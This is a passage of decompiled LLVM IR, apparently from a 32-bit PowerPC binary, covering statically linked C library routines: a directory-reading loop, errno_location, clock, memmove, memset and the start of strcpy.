  %v2_1000a3cc = inttoptr i32 %v1_1000a3cc to i32*
  %v3_1000a3cc = load i32, i32* %v2_1000a3cc, align 4
  store i32 %v3_1000a3cc, i32* %r9.global-to-local, align 4
  %v3_1000a3d0 = icmp ugt i32 %v3_1000a3cc, %v3_1000a3c8
  br i1 %v3_1000a3d0, label %dec_label_pc_1000a404, label %dec_label_pc_1000a3d8

dec_label_pc_1000a3d8:                            ; preds = %dec_label_pc_1000a3c8
  %v1_1000a3d8 = inttoptr i32 %v0_1000a3c8 to i32*
  %v2_1000a3d8 = load i32, i32* %v1_1000a3d8, align 4
  %v1_1000a3dc = add i32 %v0_1000a3c8, 12
  %v2_1000a3dc = inttoptr i32 %v1_1000a3dc to i32*
  %v3_1000a3dc = load i32, i32* %v2_1000a3dc, align 4
  %v1_1000a3e0 = add i32 %v0_1000a3c8, 20
  %v2_1000a3e0 = inttoptr i32 %v1_1000a3e0 to i32*
  %v3_1000a3e0 = load i32, i32* %v2_1000a3e0, align 4
  store i32 268477416, i32* @lr, align 4
  %v4_1000a3e4 = call i32 @__getdents(i32 %v2_1000a3d8, i32 %v3_1000a3dc, i32 %v3_1000a3e0, i32 %v3_1000a3cc)
  %v2_1000a3e8 = icmp sgt i32 %v4_1000a3e4, 0
  br i1 %v2_1000a3e8, label %dec_label_pc_1000a3f8, label %dec_label_pc_1000a3f0

dec_label_pc_1000a3f0:                            ; preds = %dec_label_pc_1000a3d8
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_1000a430

dec_label_pc_1000a3f8:                            ; preds = %dec_label_pc_1000a3d8
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000a3fc = load i32, i32* @r31, align 4
  %v2_1000a3fc = add i32 %v1_1000a3fc, 8
  %v3_1000a3fc = inttoptr i32 %v2_1000a3fc to i32*
  store i32 %v4_1000a3e4, i32* %v3_1000a3fc, align 4
  %v0_1000a400 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a400 = load i32, i32* @r31, align 4
  %v2_1000a400 = add i32 %v1_1000a400, 4
  %v3_1000a400 = inttoptr i32 %v2_1000a400 to i32*
  store i32 %v0_1000a400, i32* %v3_1000a400, align 4
  %v0_1000a404.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000a404

dec_label_pc_1000a404:                            ; preds = %dec_label_pc_1000a3c8, %dec_label_pc_1000a3f8
  %v1_1000a418 = phi i32 [ %v0_1000a3c8, %dec_label_pc_1000a3c8 ], [ %v0_1000a404.pre, %dec_label_pc_1000a3f8 ]
  %v1_1000a404 = add i32 %v1_1000a418, 4
  %v2_1000a404 = inttoptr i32 %v1_1000a404 to i32*
  %v3_1000a404 = load i32, i32* %v2_1000a404, align 4
  store i32 %v3_1000a404, i32* %r9.global-to-local, align 4
  %v1_1000a408 = add i32 %v1_1000a418, 12
  %v2_1000a408 = inttoptr i32 %v1_1000a408 to i32*
  %v3_1000a408 = load i32, i32* %v2_1000a408, align 4
  store i32 %v3_1000a408, i32* %r10.global-to-local, align 4
  %v2_1000a40c = add i32 %v3_1000a408, %v3_1000a404
  store i32 %v2_1000a40c, i32* @r29, align 4
  %v1_1000a410 = add i32 %v2_1000a40c, 4
  %v2_1000a410 = inttoptr i32 %v1_1000a410 to i32*
  %v3_1000a410 = load i32, i32* %v2_1000a410, align 4
  %v1_1000a414 = add i32 %v2_1000a40c, 8
  %v2_1000a414 = inttoptr i32 %v1_1000a414 to i16*
  %v3_1000a414 = load i16, i16* %v2_1000a414, align 2
  %v4_1000a414 = zext i16 %v3_1000a414 to i32
  store i32 %v4_1000a414, i32* %r0.global-to-local, align 4
  %v2_1000a418 = add i32 %v1_1000a418, 16
  %v3_1000a418 = inttoptr i32 %v2_1000a418 to i32*
  store i32 %v3_1000a410, i32* %v3_1000a418, align 4
  %v0_1000a41c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a41c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000a41c = add i32 %v1_1000a41c, %v0_1000a41c
  store i32 %v2_1000a41c, i32* %r0.global-to-local, align 4
  %v1_1000a420 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000a420 = add i32 %v1_1000a420, %v1_1000a41c
  %v3_1000a420 = inttoptr i32 %v2_1000a420 to i32*
  %v4_1000a420 = load i32, i32* %v3_1000a420, align 4
  store i32 %v4_1000a420, i32* %r9.global-to-local, align 4
  %v1_1000a424 = load i32, i32* @r31, align 4
  %v2_1000a424 = add i32 %v1_1000a424, 4
  %v3_1000a424 = inttoptr i32 %v2_1000a424 to i32*
  store i32 %v2_1000a41c, i32* %v3_1000a424, align 4
  %v0_1000a428 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000a428 = icmp eq i32 %v0_1000a428, 0
  br i1 %v3_1000a428, label %dec_label_pc_1000a3c8, label %dec_label_pc_1000a430

dec_label_pc_1000a430:                            ; preds = %dec_label_pc_1000a404, %dec_label_pc_1000a3f0
  store i32 268477500, i32* @lr, align 4
  %v3_1000a438 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-40, i32 1)
  store i32 %v0_1000a398, i32* %r0.global-to-local, align 4
  %v0_1000a440 = load i32, i32* @r29, align 4
  ret i32 %v0_1000a440

; uselistorder directives
  uselistorder i32 %v1_1000a418, { 0, 2, 1 }
  uselistorder i32 %v0_1000a3c8, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_1000a404, { 1, 0 }
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  %v0_1000a45c = load i32, i32* @r2, align 4
  %v1_1000a460 = add i32 %v0_1000a45c, -28672
  ret i32 %v1_1000a460
}

define i32 @clock(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_1000a470 = ptrtoint i32* %stack_var_-24 to i32
  %v1_1000a478 = call i32 @times(i32 %v2_1000a470)
  %v3_1000a47c = load i32, i32* %stack_var_-24, align 4
  %v2_1000a484 = add i32 %v3_1000a47c, %tmp
  %v1_1000a48c = mul i32 %v2_1000a484, 10000
  %v1_1000a498 = and i32 %v1_1000a48c, 2147483632
  ret i32 %v1_1000a498
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v2_1000a4a0 = icmp ult i32 %arg2, %arg1
  store i32 %arg1, i32* @r8, align 4
  store i32 %arg3, i32* @r11, align 4
  br i1 %v2_1000a4a0, label %dec_label_pc_1000a4b4, label %dec_label_pc_1000a4b0

dec_label_pc_1000a4b0:                            ; preds = %entry
  %v0_1000a4b0 = call i32 @memcpy()
  store i32 %v0_1000a4b0, i32* @r3, align 4
  br label %dec_label_pc_1000a4b4

dec_label_pc_1000a4b4:                            ; preds = %entry, %dec_label_pc_1000a4b0
  %v1_1000a4b4 = call i32 @__asm_rlwinm.(i32 %arg3, i32 29, i32 3, i32 31)
  store i32 %v1_1000a4b4, i32* %r9.global-to-local, align 4
  %v4_1000a4b4 = icmp eq i32 %v1_1000a4b4, 0
  %v2_1000a4b8 = add i32 %arg3, %arg2
  store i32 %v2_1000a4b8, i32* %r4.global-to-local, align 4
  %v0_1000a4bc = load i32, i32* @r3, align 4
  %v2_1000a4bc = add i32 %v0_1000a4bc, %arg3
  store i32 %v2_1000a4bc, i32* %r10.global-to-local, align 4
  br i1 %v4_1000a4b4, label %dec_label_pc_1000a4e4, label %dec_label_pc_1000a4c4

dec_label_pc_1000a4c4:                            ; preds = %dec_label_pc_1000a4b4
  %v1_1000a4c4 = urem i32 %v2_1000a4bc, 4
  %v3_1000a4c4 = icmp eq i32 %v1_1000a4c4, 0
  br i1 %v3_1000a4c4, label %dec_label_pc_1000a4cc, label %dec_label_pc_1000a518

dec_label_pc_1000a4cc:                            ; preds = %dec_label_pc_1000a530.dec_label_pc_1000a4cc_crit_edge, %dec_label_pc_1000a4c4
  %v1_1000a4d8.pre = phi i32 [ %v1_1000a4d8.pre.pre, %dec_label_pc_1000a530.dec_label_pc_1000a4cc_crit_edge ], [ %v2_1000a4bc, %dec_label_pc_1000a4c4 ]
  %v0_1000a4cc = phi i32 [ %v1_1000a530, %dec_label_pc_1000a530.dec_label_pc_1000a4cc_crit_edge ], [ %v1_1000a4b4, %dec_label_pc_1000a4c4 ]
  store i32 %v0_1000a4cc, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000a4d0

dec_label_pc_1000a4d0:                            ; preds = %dec_label_pc_1000a4d0, %dec_label_pc_1000a4cc
  %v1_1000a4d8 = phi i32 [ %v2_1000a4dc, %dec_label_pc_1000a4d0 ], [ %v1_1000a4d8.pre, %dec_label_pc_1000a4cc ]
  %v0_1000a4d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a4d0 = add i32 %v0_1000a4d0, -4
  %v2_1000a4d0 = inttoptr i32 %v1_1000a4d0 to i32*
  %v3_1000a4d0 = load i32, i32* %v2_1000a4d0, align 4
  %v1_1000a4d4 = add i32 %v0_1000a4d0, -8
  %v2_1000a4d4 = inttoptr i32 %v1_1000a4d4 to i32*
  %v3_1000a4d4 = load i32, i32* %v2_1000a4d4, align 4
  store i32 %v3_1000a4d4, i32* %r9.global-to-local, align 4
  store i32 %v1_1000a4d4, i32* %r4.global-to-local, align 4
  %v2_1000a4d8 = add i32 %v1_1000a4d8, -4
  %v3_1000a4d8 = inttoptr i32 %v2_1000a4d8 to i32*
  store i32 %v3_1000a4d0, i32* %v3_1000a4d8, align 4
  %v0_1000a4dc = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a4dc = load i32, i32* %r10.global-to-local, align 4
  %v2_1000a4dc = add i32 %v1_1000a4dc, -8
  %v3_1000a4dc = inttoptr i32 %v2_1000a4dc to i32*
  store i32 %v0_1000a4dc, i32* %v3_1000a4dc, align 4
  store i32 %v2_1000a4dc, i32* %r10.global-to-local, align 4
  %v0_1000a4e0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a4e0 = add i32 %v0_1000a4e0, -1
  store i32 %v1_1000a4e0, i32* %ctr.global-to-local, align 4
  %v2_1000a4e0 = icmp eq i32 %v1_1000a4e0, 0
  br i1 %v2_1000a4e0, label %dec_label_pc_1000a4e4, label %dec_label_pc_1000a4d0

dec_label_pc_1000a4e4:                            ; preds = %dec_label_pc_1000a4d0, %dec_label_pc_1000a530, %dec_label_pc_1000a4b4
  %v0_1000a4e4 = load i32, i32* @r11, align 4
  %v1_1000a4e4 = urem i32 %v0_1000a4e4, 8
  store i32 %v1_1000a4e4, i32* %r5.global-to-local, align 4
  %tmp = icmp ult i32 %v1_1000a4e4, 4
  br i1 %tmp, label %dec_label_pc_1000a4fc, label %dec_label_pc_1000a4f0

dec_label_pc_1000a4f0:                            ; preds = %dec_label_pc_1000a4e4
  %v0_1000a4f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a4f0 = add i32 %v0_1000a4f0, -4
  %v2_1000a4f0 = inttoptr i32 %v1_1000a4f0 to i32*
  %v3_1000a4f0 = load i32, i32* %v2_1000a4f0, align 4
  store i32 %v1_1000a4f0, i32* %r4.global-to-local, align 4
  %v1_1000a4f4 = add nsw i32 %v1_1000a4e4, -4
  store i32 %v1_1000a4f4, i32* %r5.global-to-local, align 4
  %v1_1000a4f8 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000a4f8 = add i32 %v1_1000a4f8, -4
  %v3_1000a4f8 = inttoptr i32 %v2_1000a4f8 to i32*
  store i32 %v3_1000a4f0, i32* %v3_1000a4f8, align 4
  store i32 %v2_1000a4f8, i32* %r10.global-to-local, align 4
  %v0_1000a4fc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000a4fc

dec_label_pc_1000a4fc:                            ; preds = %dec_label_pc_1000a4e4, %dec_label_pc_1000a4f0
  %v0_1000a504 = phi i32 [ %v1_1000a4e4, %dec_label_pc_1000a4e4 ], [ %v0_1000a4fc.pre, %dec_label_pc_1000a4f0 ]
  %v3_1000a4fc = icmp eq i32 %v0_1000a504, 0
  br i1 %v3_1000a4fc, label %dec_label_pc_1000a53c, label %dec_label_pc_1000a504

dec_label_pc_1000a504:                            ; preds = %dec_label_pc_1000a4fc
  store i32 %v0_1000a504, i32* %ctr.global-to-local, align 4
  %v2_1000a50c.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000a508

dec_label_pc_1000a508:                            ; preds = %dec_label_pc_1000a508, %dec_label_pc_1000a504
  %v2_1000a50c = phi i32 [ %v3_1000a50c, %dec_label_pc_1000a508 ], [ %v2_1000a50c.pre, %dec_label_pc_1000a504 ]
  %v0_1000a508 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a508 = add i32 %v0_1000a508, -1
  %v2_1000a508 = inttoptr i32 %v1_1000a508 to i8*
  %v3_1000a508 = load i8, i8* %v2_1000a508, align 1
  store i32 %v1_1000a508, i32* %r4.global-to-local, align 4
  %v3_1000a50c = add i32 %v2_1000a50c, -1
  %v4_1000a50c = inttoptr i32 %v3_1000a50c to i8*
  store i8 %v3_1000a508, i8* %v4_1000a50c, align 1
  store i32 %v3_1000a50c, i32* %r10.global-to-local, align 4
  %v0_1000a510 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a510 = add i32 %v0_1000a510, -1
  store i32 %v1_1000a510, i32* %ctr.global-to-local, align 4
  %v2_1000a510 = icmp eq i32 %v1_1000a510, 0
  br i1 %v2_1000a510, label %dec_label_pc_1000a53c, label %dec_label_pc_1000a508

dec_label_pc_1000a518:                            ; preds = %dec_label_pc_1000a4c4
  %v1_1000a518 = sub nsw i32 4, %v1_1000a4c4
  store i32 %v1_1000a518, i32* %ctr.global-to-local, align 4
  %v2_1000a520 = sub i32 %arg3, %v1_1000a518
  store i32 %v2_1000a520, i32* @r11, align 4
  %v1_1000a5248 = add i32 %v2_1000a4b8, -1
  %v2_1000a5249 = inttoptr i32 %v1_1000a5248 to i8*
  %v3_1000a52410 = load i8, i8* %v2_1000a5249, align 1
  store i32 %v1_1000a5248, i32* %r4.global-to-local, align 4
  %v3_1000a52812 = add i32 %v2_1000a4bc, -1
  %v4_1000a52813 = inttoptr i32 %v3_1000a52812 to i8*
  store i8 %v3_1000a52410, i8* %v4_1000a52813, align 1
  store i32 %v3_1000a52812, i32* %r10.global-to-local, align 4
  %v0_1000a52c14 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a52c15 = add i32 %v0_1000a52c14, -1
  store i32 %v1_1000a52c15, i32* %ctr.global-to-local, align 4
  %v2_1000a52c16 = icmp eq i32 %v1_1000a52c15, 0
  br i1 %v2_1000a52c16, label %dec_label_pc_1000a530, label %dec_label_pc_1000a524.dec_label_pc_1000a524_crit_edge

dec_label_pc_1000a524.dec_label_pc_1000a524_crit_edge: ; preds = %dec_label_pc_1000a518, %dec_label_pc_1000a524.dec_label_pc_1000a524_crit_edge
  %v3_1000a52817 = phi i32 [ %v3_1000a528, %dec_label_pc_1000a524.dec_label_pc_1000a524_crit_edge ], [ %v3_1000a52812, %dec_label_pc_1000a518 ]
  %v0_1000a524.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a524 = add i32 %v0_1000a524.pre, -1
  %v2_1000a524 = inttoptr i32 %v1_1000a524 to i8*
  %v3_1000a524 = load i8, i8* %v2_1000a524, align 1
  store i32 %v1_1000a524, i32* %r4.global-to-local, align 4
  %v3_1000a528 = add i32 %v3_1000a52817, -1
  %v4_1000a528 = inttoptr i32 %v3_1000a528 to i8*
  store i8 %v3_1000a524, i8* %v4_1000a528, align 1
  store i32 %v3_1000a528, i32* %r10.global-to-local, align 4
  %v0_1000a52c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a52c = add i32 %v0_1000a52c, -1
  store i32 %v1_1000a52c, i32* %ctr.global-to-local, align 4
  %v2_1000a52c = icmp eq i32 %v1_1000a52c, 0
  br i1 %v2_1000a52c, label %dec_label_pc_1000a530, label %dec_label_pc_1000a524.dec_label_pc_1000a524_crit_edge

dec_label_pc_1000a530:                            ; preds = %dec_label_pc_1000a524.dec_label_pc_1000a524_crit_edge, %dec_label_pc_1000a518
  %v0_1000a530 = load i32, i32* @r11, align 4
  %v1_1000a530 = call i32 @__asm_rlwinm.(i32 %v0_1000a530, i32 29, i32 3, i32 31)
  store i32 %v1_1000a530, i32* %r9.global-to-local, align 4
  %v4_1000a530 = icmp eq i32 %v1_1000a530, 0
  br i1 %v4_1000a530, label %dec_label_pc_1000a4e4, label %dec_label_pc_1000a530.dec_label_pc_1000a4cc_crit_edge

dec_label_pc_1000a530.dec_label_pc_1000a4cc_crit_edge: ; preds = %dec_label_pc_1000a530
  %v1_1000a4d8.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000a4cc

dec_label_pc_1000a53c:                            ; preds = %dec_label_pc_1000a508, %dec_label_pc_1000a4fc
  %v0_1000a53c = load i32, i32* @r8, align 4
  ret i32 %v0_1000a53c

; uselistorder directives
  uselistorder i32 %v1_1000a530, { 1, 2, 0 }
  uselistorder i32 %v1_1000a52c, { 1, 0 }
  uselistorder i32 %v3_1000a528, { 1, 2, 0 }
  uselistorder i32 %v1_1000a510, { 1, 0 }
  uselistorder i32 %v3_1000a50c, { 1, 2, 0 }
  uselistorder i32 %v1_1000a4e4, { 3, 2, 1, 0 }
  uselistorder i32 %v1_1000a4e0, { 1, 0 }
  uselistorder i32 %v2_1000a4dc, { 1, 2, 0 }
  uselistorder i32 %v1_1000a4c4, { 1, 0 }
  uselistorder i32 %v2_1000a4bc, { 1, 2, 0, 3 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3, 6, 4, 8, 5, 7, 9 }
  uselistorder i32* %r10.global-to-local, { 1, 2, 0, 3, 8, 4, 6, 5, 7, 9 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 %arg3, { 4, 0, 1, 2, 3, 5 }
  uselistorder label %dec_label_pc_1000a524.dec_label_pc_1000a524_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000a4fc, { 1, 0 }
  uselistorder label %dec_label_pc_1000a4e4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a4b4, { 1, 0 }
}

define i32 @__GI_memset(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_1000a544 = call i32 @__asm_rlwinm.(i32 %arg3, i32 29, i32 3, i32 31)
  store i32 %v1_1000a544, i32* %r9.global-to-local, align 4
  %v4_1000a544 = icmp eq i32 %v1_1000a544, 0
  store i1 %v4_1000a544, i1* @cr0_eq, align 1
  %v1_1000a54c = add i32 %arg1, -4
  store i32 %v1_1000a54c, i32* @r11, align 4
  %v1_1000a550 = call i32 @__asm_rlwimi(i32 %arg2, i32 8, i32 16, i32 23)
  %v1_1000a554 = call i32 @__asm_rlwimi(i32 %v1_1000a550, i32 16, i32 0, i32 15)
  %v2_1000a554 = trunc i32 %v1_1000a554 to i8
  %v0_1000a558 = load i1, i1* @cr0_eq, align 1
  br i1 %v0_1000a558, label %dec_label_pc_1000a57c, label %dec_label_pc_1000a55c

dec_label_pc_1000a55c:                            ; preds = %entry
  %v0_1000a55c = load i32, i32* @r11, align 4
  %v1_1000a55c = urem i32 %v0_1000a55c, 4
  %v3_1000a55c = icmp eq i32 %v1_1000a55c, 0
  store i1 %v3_1000a55c, i1* @cr0_eq, align 1
  br i1 %v3_1000a55c, label %dec_label_pc_1000a55c.dec_label_pc_1000a564_crit_edge, label %dec_label_pc_1000a5ac

dec_label_pc_1000a55c.dec_label_pc_1000a564_crit_edge: ; preds = %dec_label_pc_1000a55c
  %v0_1000a564.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000a564

dec_label_pc_1000a564:                            ; preds = %dec_label_pc_1000a5c4.dec_label_pc_1000a564_crit_edge, %dec_label_pc_1000a55c.dec_label_pc_1000a564_crit_edge
  %v0_1000a568.pre = phi i32 [ %v0_1000a55c, %dec_label_pc_1000a55c.dec_label_pc_1000a564_crit_edge ], [ %v0_1000a568.pre.pre, %dec_label_pc_1000a5c4.dec_label_pc_1000a564_crit_edge ]
  %v0_1000a564 = phi i32 [ %v0_1000a564.pre, %dec_label_pc_1000a55c.dec_label_pc_1000a564_crit_edge ], [ %v1_1000a5c4, %dec_label_pc_1000a5c4.dec_label_pc_1000a564_crit_edge ]
  store i32 %v0_1000a564, i32* %ctr.global-to-local, align 4
  %v1_1000a56c = sext i8 %v2_1000a554 to i32
  br label %dec_label_pc_1000a568

dec_label_pc_1000a568:                            ; preds = %dec_label_pc_1000a568, %dec_label_pc_1000a564
  %v0_1000a568 = phi i32 [ %v1_1000a574, %dec_label_pc_1000a568 ], [ %v0_1000a568.pre, %dec_label_pc_1000a564 ]
  %v1_1000a568 = add i32 %v0_1000a568, 4
  store i32 %v1_1000a568, i32* %r9.global-to-local, align 4
  %v4_1000a56c = inttoptr i32 %v1_1000a568 to i32*
  store i32 %v1_1000a56c, i32* %v4_1000a56c, align 4
  %v2_1000a570 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000a570 = add i32 %v2_1000a570, 4
  %v4_1000a570 = inttoptr i32 %v3_1000a570 to i32*
  store i32 %v1_1000a56c, i32* %v4_1000a570, align 4
  %v0_1000a574 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a574 = add i32 %v0_1000a574, 4
  store i32 %v1_1000a574, i32* @r11, align 4
  %v0_1000a578 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a578 = add i32 %v0_1000a578, -1
  store i32 %v1_1000a578, i32* %ctr.global-to-local, align 4
  %v2_1000a578 = icmp eq i32 %v1_1000a578, 0
  br i1 %v2_1000a578, label %dec_label_pc_1000a57c, label %dec_label_pc_1000a568

dec_label_pc_1000a57c:                            ; preds = %dec_label_pc_1000a568, %dec_label_pc_1000a5c4, %entry
  %v0_1000a57c = load i32, i32* %r5.global-to-local, align 4
  %v1_1000a57c = urem i32 %v0_1000a57c, 8
  store i32 %v1_1000a57c, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_1000a57c, 4
  br i1 %tmp, label %dec_label_pc_1000a590, label %dec_label_pc_1000a588

dec_label_pc_1000a588:                            ; preds = %dec_label_pc_1000a57c
  %v1_1000a588 = sext i8 %v2_1000a554 to i32
  %v2_1000a588 = load i32, i32* @r11, align 4
  %v3_1000a588 = add i32 %v2_1000a588, 4
  %v4_1000a588 = inttoptr i32 %v3_1000a588 to i32*
  store i32 %v1_1000a588, i32* %v4_1000a588, align 4
  store i32 %v3_1000a588, i32* @r11, align 4
  %v0_1000a58c = load i32, i32* @r5, align 4
  %v1_1000a58c = add i32 %v0_1000a58c, -4
  store i32 %v1_1000a58c, i32* @r5, align 4
  br label %dec_label_pc_1000a590

dec_label_pc_1000a590:                            ; preds = %dec_label_pc_1000a57c, %dec_label_pc_1000a588
  %v0_1000a590 = phi i32 [ %v1_1000a57c, %dec_label_pc_1000a57c ], [ %v1_1000a58c, %dec_label_pc_1000a588 ]
  %v3_1000a590 = icmp eq i32 %v0_1000a590, 0
  %v0_1000a594 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a590, i32 %v0_1000a594)
  %v0_1000a598 = load i32, i32* @r5, align 4
  store i32 %v0_1000a598, i32* %ctr.global-to-local, align 4
  %v0_1000a59c = load i32, i32* @r11, align 4
  %v1_1000a59c = add i32 %v0_1000a59c, 3
  store i32 %v1_1000a59c, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000a5a0

dec_label_pc_1000a5a0:                            ; preds = %dec_label_pc_1000a5a0, %dec_label_pc_1000a590
  %v3_1000a5a0 = phi i32 [ %v4_1000a5a0, %dec_label_pc_1000a5a0 ], [ %v1_1000a59c, %dec_label_pc_1000a590 ]
  %v4_1000a5a0 = add i32 %v3_1000a5a0, 1
  %v5_1000a5a0 = inttoptr i32 %v4_1000a5a0 to i8*
  store i8 %v2_1000a554, i8* %v5_1000a5a0, align 1
  store i32 %v4_1000a5a0, i32* @r9, align 4
  %v0_1000a5a4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a5a4 = add i32 %v0_1000a5a4, -1
  store i32 %v1_1000a5a4, i32* %ctr.global-to-local, align 4
  %v2_1000a5a4 = icmp eq i32 %v1_1000a5a4, 0
  br i1 %v2_1000a5a4, label %dec_label_pc_1000a5d0, label %dec_label_pc_1000a5a0

dec_label_pc_1000a5ac:                            ; preds = %dec_label_pc_1000a55c
  %v1_1000a5ac = sub nsw i32 4, %v1_1000a55c
  store i32 %v1_1000a5ac, i32* %ctr.global-to-local, align 4
  %v1_1000a5b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1000a5b4 = sub i32 %v1_1000a5b4, %v1_1000a5ac
  store i32 %v2_1000a5b4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000a5b8

dec_label_pc_1000a5b8:                            ; preds = %dec_label_pc_1000a5b8, %dec_label_pc_1000a5ac
  %v3_1000a5b8 = phi i32 [ %v1_1000a5bc, %dec_label_pc_1000a5b8 ], [ %v0_1000a55c, %dec_label_pc_1000a5ac ]
  %v4_1000a5b8 = add i32 %v3_1000a5b8, 4
  %v5_1000a5b8 = inttoptr i32 %v4_1000a5b8 to i8*
  store i8 %v2_1000a554, i8* %v5_1000a5b8, align 1
  %v0_1000a5bc = load i32, i32* @r11, align 4
  %v1_1000a5bc = add i32 %v0_1000a5bc, 1
  store i32 %v1_1000a5bc, i32* @r11, align 4
  %v0_1000a5c0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a5c0 = add i32 %v0_1000a5c0, -1
  store i32 %v1_1000a5c0, i32* %ctr.global-to-local, align 4
  %v2_1000a5c0 = icmp eq i32 %v1_1000a5c0, 0
  br i1 %v2_1000a5c0, label %dec_label_pc_1000a5c4, label %dec_label_pc_1000a5b8

dec_label_pc_1000a5c4:                            ; preds = %dec_label_pc_1000a5b8
  %v0_1000a5c4 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000a5c4 = call i32 @__asm_rlwinm.(i32 %v0_1000a5c4, i32 29, i32 3, i32 31)
  store i32 %v1_1000a5c4, i32* %r9.global-to-local, align 4
  %v4_1000a5c4 = icmp eq i32 %v1_1000a5c4, 0
  store i1 %v4_1000a5c4, i1* @cr0_eq, align 1
  br i1 %v4_1000a5c4, label %dec_label_pc_1000a57c, label %dec_label_pc_1000a5c4.dec_label_pc_1000a564_crit_edge

dec_label_pc_1000a5c4.dec_label_pc_1000a564_crit_edge: ; preds = %dec_label_pc_1000a5c4
  %v0_1000a568.pre.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_1000a564

dec_label_pc_1000a5d0:                            ; preds = %dec_label_pc_1000a5a0
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000a5c4, { 1, 2, 0 }
  uselistorder i32 %v1_1000a5c0, { 1, 0 }
  uselistorder i32 %v1_1000a5bc, { 1, 0 }
  uselistorder i32 %v1_1000a5a4, { 1, 0 }
  uselistorder i32 %v4_1000a5a0, { 1, 2, 0 }
  uselistorder i32 %v1_1000a57c, { 2, 1, 0 }
  uselistorder i32 %v1_1000a578, { 1, 0 }
  uselistorder i32 %v1_1000a574, { 1, 0 }
  uselistorder i32 %v1_1000a55c, { 1, 0 }
  uselistorder i32 %v0_1000a55c, { 2, 1, 0 }
  uselistorder i8 %v2_1000a554, { 3, 1, 2, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 4, 0, 3, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwimi, { 50, 51, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder label %dec_label_pc_1000a590, { 1, 0 }
  uselistorder label %dec_label_pc_1000a57c, { 1, 0, 2 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000a5d8

dec_label_pc_1000a5d8:                            ; preds = %dec_label_pc_1000a5d8, %entry
  %v2_1000a5e4 = phi i32 [ %v1_1000a5e8, %dec_label_pc_1000a5d8 ], [ %tmp, %entry ]
  %v0_1000a5d8 = load i32, i32* @r4, align 4
  %v1_1000a5d8 = inttoptr i32 %v0_1000a5d8 to i8*
  %v2_1000a5d8 = load i8, i8* %v1_1000a5d8, align 1
  %v1_1000a5dc = add i32 %v0_1000a5d8, 1
  store i32 %v1_1000a5dc, i32* @r4, align 4
  %v3_1000a5e0 = icmp eq i8 %v2_1000a5d8, 0
  store i1 %v3_1000a5e0, i1* %cr7_eq.global-to-local, align 1
  %v3_1000a5e4 = inttoptr i32 %v2_1000a5e4 to i8*
